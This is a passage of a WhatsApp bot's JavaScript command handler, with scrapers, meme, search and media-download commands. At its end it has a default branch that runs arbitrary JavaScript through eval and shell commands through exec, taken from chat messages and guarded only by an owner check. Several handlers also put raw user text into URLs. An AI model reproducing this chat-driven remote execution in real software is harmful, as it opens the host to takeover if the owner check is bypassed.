*Rating:* ${out.rating || "-"}
*Pengembang:* ${out.author || "-"}
*Thumbnail:* ${out.thumbnail || "-"}`;
    await replyphistar(caption);
  } catch (e) {
    await replyphistar(`${e.message}`);
  }
}
break;

case 'top': {
  if (!m.isGroup) return replyphistar("This command can only be used in groups.");
  if (!text) return replyphistar(`Example: .top lovers`);
  let member = participants.map(u => u.id);
  let top1 = member[Math.floor(Math.random() * member.length)];
  let top2 = member[Math.floor(Math.random() * member.length)];
  let top3 = member[Math.floor(Math.random() * member.length)];
  let top4 = member[Math.floor(Math.random() * member.length)];
  let top5 = member[Math.floor(Math.random() * member.length)];
  let jawab = `Top 5 *${text}*

1. @${top1.split('@')[0]}
2. @${top2.split('@')[0]}
3. @${top3.split('@')[0]}
4. @${top4.split('@')[0]}
5. @${top5.split('@')[0]}
`;
  let menst = [top1, top2, top3, top4, top5];
  await PhistarBotInc.sendText(m.chat, jawab, m, { mentions: menst });
}
break;

case 'del': case 'd': {
  PhistarBotInc.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: true,
      id: m.quoted.id,
      participant: m.quoted.sender
    }
  });
}
break;

case 'npms': {
  if (!text) return replyphistar('Input Query');
  let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`);
  let { objects } = await res.json();
  if (!objects.length) return replyphistar(`Query "${text}" not found :/`);
  let txt = objects.map(({ package: pkg }) => {
    return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`;
  }).join`\n\n`;
  replyphistar(txt);
}
break;

case 'next-holiday': {
  replyphistar('Please wait...');
  async function nexLibur() {
    const { data } = await axios.get("https://www.liburnasional.com/");
    let libnas_content = [];
    let $ = cheerio.load(data);
    let result = {
      nextLibur:
        "Holiday" +
        $("div.row.row-alert > div").text().split("Hari libur")[1].trim(),
      libnas_content
    };
    $("tbody > tr > td > span > div").each(function (a, b) {
      let summary = $(b).find("span > strong > a").text();
      let days = $(b).find("div.libnas-calendar-holiday-weekday").text();
      let dateMonth = $(b).find("time.libnas-calendar-holiday-datemonth").text();
      libnas_content.push({ summary, days, dateMonth });
    });
    return result;
  }
  try {
    let teks = `*${(await nexLibur()).nextLibur}*\n\n`;
    let result = (await nexLibur()).libnas_content;

    for (let a of result) {
      teks += `Date: ${a.summary}\nDate: ${a.days}\nMonth: ${a.dateMonth}\n\n`;
    }
    replyphistar(teks);
  } catch (e) {
    replyphistar(e.message);
  }
}
break;

case 'lahelu': {
  let tags = ['funny', 'relate', 'gaming', 'nostalgia', 'technology', 'random', 'comic', 'edit', 'wtf', 'sport', 'opinion', 'dark', 'absurd', 'cringe', 'sus', 'animals'];
  if (text && !tags.includes(text)) return replyphistar(`Meme "${text}" not found! \n\n${tags.map(v => `- ${v}`).join('\n')}`);
  let url;
  let page = Math.round(Math.random() * 25);
  if (!text) url = `https://lahelu.com/api/post/get-posts?feed=1&page=${page}`;
  if (text) url = `https://lahelu.com/api/post/get-posts?feed=1&hashtags[]=${text}&page=${page}`;
  let anu = (await axios.get(url)).data;
  let data = anu.postInfos[Math.floor(Math.random() * anu.postInfos.length)];
  if (/^video/i.test(data.media)) return await PhistarBotInc.sendMessage(m.chat, { video: { url: 'https://cache.lahelu.com/' + data.media }, caption: data.title, viewOnce: true }, { quoted: m });
  if (/^image/i.test(data.media)) return await PhistarBotInc.sendMessage(m.chat, { image: { url: 'https://cache.lahelu.com/' + data.media }, caption: data.title, viewOnce: true }, { quoted: m });
}
break;

case 'ebay': {
  if (!q) return replyphistar(`What are you looking for?`);
  async function azvxz(query) {
    try {
      const url = `https://www.ebay.com/sch/i.html?_nkw=${encodeURIComponent(query)}`;
      const { data } = await axios.get(url);
      const $ = cheerio.load(data);
      const results = [];
      $('.s-item').each((index, element) => {
        const title = $(element).find('.s-item__title').text().trim();
        const price = $(element).find('.s-item__price').text().trim();
        const link = $(element).find('.s-item__link').attr('href');
        if (title && title !== "Shop on eBay") {
          results.push({ title, price, link });
        }
      });
      return results;
    } catch (error) {
      console.error('Error:', error);
      return [];
    }
  }
  const query = q;
  try {
    const results = await azvxz(query);
    if (results.length === 0) {
      replyphistar("No results found for your search.");
    } else {
      let response = "eBay search results:\n\n";
      results.forEach((item, index) => {
        response += `${index + 1}. ${item.title}\nPrice: ${item.price}\nLink: ${item.link}\n\n`;
      });
      replyphistar(response);
    }
  } catch (error) {
    replyphistar("An error occurred.");
  }
}
break;

case 'rangkum': {
  if (!q) return replyphistar(`Enter the sentence you want to summarize`);
  const sentences = `${q}`.match(/[^.!?]+[.!?]/g) || [];
  const wordFrequency = {};
  sentences.forEach(sentence => {
    const words = sentence.toLowerCase().split(/\s+/);
    words.forEach(word => {
      word = word.replace(/[.,!?]/g, '');
      if (word.length > 0) {
        if (wordFrequency[word]) {
          wordFrequency[word]++;
        } else {
          wordFrequency[word] = 1;
        }
      }
    });
  });
  const sortedWords = Object.keys(wordFrequency).sort((a, b) => wordFrequency[b] - wordFrequency[a]);
  const summarySentences = sentences
    .filter(sentence => {
      const words = sentence.toLowerCase().split(/\s+/).map(word => word.replace(/[.,!?]/g, ''));
      return words.some(word => sortedWords.includes(word));
    })
    .slice(0, 3);
  const summary = summarySentences.join(' ');
  replyphistar(summary || "Failed to summarize text.");
}
break;

case 'animecharacter': {
  if (!text) {
    replyphistar('Example: animecharacter naruto');
    return;
  }
  replyphistar('_Patience sir, looking for anime characters..._');
  async function getCharacterInfo(characterName) {
    const query = `
    query ($search: String) {
      Character(search: $search) {
        name {
          full
        }
        description
        media {
          nodes {
            title {
              romaji
            }
          }
        }
      }
    }
    `;
    const variables = {
      search: characterName
    };
    const response = await fetch('https://graphql.anilist.co', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
      },
      body: JSON.stringify({
        query: query,
        variables: variables
      })
    });
    if (!response.ok) {
      throw new Error('Failed to fetch Character data');
    }
    const data = await response.json();
    return data.data.Character;
  }
  try {
    const query = text.trim();
    const characterInfo = await getCharacterInfo(query);
    if (!characterInfo) {
      replyphistar('Character not found.');
      return;
    }
    const name = characterInfo.name.full;
    const description = characterInfo.description || 'Description None';
    const mediaTitles = characterInfo.media.nodes.map(node => node.title.romaji).join(', ');
    const formattedDescription = description
      .replace(/\n/g, '\n\n')
      .replace(/__([^__]+)__/g, '*$1*')
      .replace(/~\!?\[([^\]]+)]\(([^)]+)\)~?/g, '*$1* ($2)')
      .replace(/^\s+/gm, '');
    const result = `*Name Character:* ${name}\n\n*Description:* ${formattedDescription}\n\n*Media Related:* ${mediaTitles}`;
    replyphistar(result);
  } catch (error) {
    replyphistar(`There is an error: ${error.message}`);
  }
}
break;

case 'gimage': {
  if (!text) return replyphistar(`Example: gimage phistar`);
  replyphistar('Please wait...');
  const nyariGambar = async (query) => {
    const url = `https://www.google.com/search?q=${encodeURIComponent(query)}&tbm=isch`;
    const { data } = await axios.get(url);
    const $ = cheerio.load(data);
    let images = [];
    $('img').each((i, elem) => {
      images.push($(elem).attr('src'));
    });
    return images;
  };
  nyariGambar(text).then(images => {
    if (images.length === 0) {
      return replyphistar('No picture.');
    }
    let imageAvz = images[Math.floor(Math.random() * images.length)];
    PhistarBotInc.sendMessage(m.chat, { image: { url: imageAvz }, caption: `*Query* : ${text}\n*Media Url* : ${imageAvz}` }, { quoted: m });
  }).catch(error => {
    replyphistar('There is an error.');
  });
}
break;

case 'kbbi-kemdikbud': {
  if (!text) return replyphistar('Example: kbbi-kemdikbud kata');
  const url = `https://kbbi.kemdikbud.go.id/entri/${encodeURIComponent(text)}`;
  axios.get(url).then(response => {
    const $ = cheerio.load(response.data);
    let definition = $('ol').first().text().trim();
    if (!definition) {
      return replyphistar('Word not found in KBBI.');
    }
    PhistarBotInc.sendMessage(m.chat, { text: `${definition}` }, { quoted: m });
  }).catch(error => {
    replyphistar('An error occurred.');
  });
}
break;

case 'photoleap': {
  if (!q) return replyphistar(`Example \n\nphotoleap girl crying`);
  async function textToImageVsky(text) {
    try {
      const { data } = await axios.get("https://tti.photoleapapp.com/api/v1/generate?prompt=" + encodeURIComponent(text));
      return data;
    } catch (err) {
      return null;
    }
  }
  const result = await textToImageVsky(q);
  if (result && result.result_url) {
    const imageUrl = result.result_url;
    const message = {
      image: { url: imageUrl },
      caption: '𝐏𝐇𝐈𝐒𝐓𝐀𝐑𝐁𝐎𝐓𝐈𝐍𝐂'
    };
    PhistarBotInc.sendMessage(m.chat, message);
  } else {
    replyphistar('An error occurred.');
  }
}
break;

case 'picsum': {
  if (!q) return replyphistar(`Example \n\npicsum nature`);
  async function picSumAvz(text) {
    try {
      const imageUrl = `https://picsum.photos/seed/${text}/800/600`;
      return imageUrl;
    } catch (err) {
      return null;
    }
  }
  const result = await picSumAvz(q);
  if (result) {
    const message = {
      image: { url: result },
      caption: `image search results : ${q}`
    };
    PhistarBotInc.sendMessage(m.chat, message);
  } else {
    replyphistar('An error occurred.');
  }
}
break;

case 'readmore': {
  const more = String.fromCharCode(8206);
  const readmore = more.repeat(4001);
  let [l, r] = text.split`|`;
  if (!l) l = '';
  if (!r) r = '';
  PhistarBotInc.sendMessage(m.chat, { text: l + readmore + r }, { quoted: m });
}
break;

case 'gsmarena': {
  if (!q) {
    replyphistar('Please enter the name of the device you want to search for.');
    return;
  }
  async function gsmSearch(q) {
    try {
      const response = await axios({
        method: "get",
        url: `https://gsmarena.com/results.php3?sQuickSearch=yes&sName=${q}`
      });
      const $ = cheerio.load(response.data);
      const result = [];
      const device = $(".makers").find("li");
      device.each((i, e) => {
        const img = $(e).find("img");
        result.push({
          id: $(e).find("a").attr("href").replace(".php", ""),
          name: $(e).find("span").html().split("<br>").join(" "),
          description: img.attr("title")
        });
      });
      return result;
    } catch (error) {
      console.error(error);
      throw error;
    }
  }
  gsmSearch(q).then(results => {
    if (results.length === 0) {
      replyphistar('No results found.');
      return;
    }
    let replyText = `Search results for "${q}":\n\n`;
    results.forEach((device, index) => {
      replyText += `${index + 1}. ${device.name}\nDescription: ${device.description}\nLink: https://gsmarena.com/${device.id}.php\n\n`;
    });
    replyphistar(replyText);
  }).catch(error => {
    replyphistar('An error occurred while searching for devices.');
    console.error(error);
  });
}
break;

case 'igvid': case 'igmp4': {
  if (!text) return replyphistar(`You need to provide the video URL, reel`);
  let res;
  try {
    res = await fetch(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
  } catch (error) {
    return replyphistar(`An error occurred: ${error.message}`);
  }
  let api_response;
  try {
    api_response = await res.json();
  } catch (error) {
    return replyphistar(`Failed to parse API response: ${error.message}`);
  }
  if (!api_response || !api_response.result || api_response.result.length === 0) {
    return replyphistar(`No video or image found or Invalid response from API.`);
  }
  try {
    const mediaData = api_response.result[0];
    const mediaURL = mediaData.url;
    const cap = `HERE IS THE VIDEO`;
    await PhistarBotInc.sendMessage(m.chat, { video: { url: mediaURL }, caption: cap }, { quoted: m });
  } catch (error) {
    return replyphistar(`Failed to send media: ${error}`);
  }
}
break;
            default:
                if (body.startsWith('=>')) {
                    if (!isCreator) return replyphistar(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyphistar(bang)
                    }
                    try {
                        replyphistar(util.format(eval(`(async () => { return ${body.slice(3)} })()`)))
                    } catch (e) {
                        replyphistar(String(e))
                    }
                }

                if (body.startsWith('>')) {
                    if (!isCreator) return replyphistar(mess.owner)
                    try {
                        let evaled = await eval(body.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyphistar(evaled)
                    } catch (err) {
                        await replyphistar(String(err))
                    }
                }
                if (body.startsWith('$')) {
                    if (!isCreator) return replyphistar(mess.owner)
                    exec(body.slice(2), (err, stdout) => {
                        if (err) return replyphistar(err)
                        if (stdout) return replyphistar(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
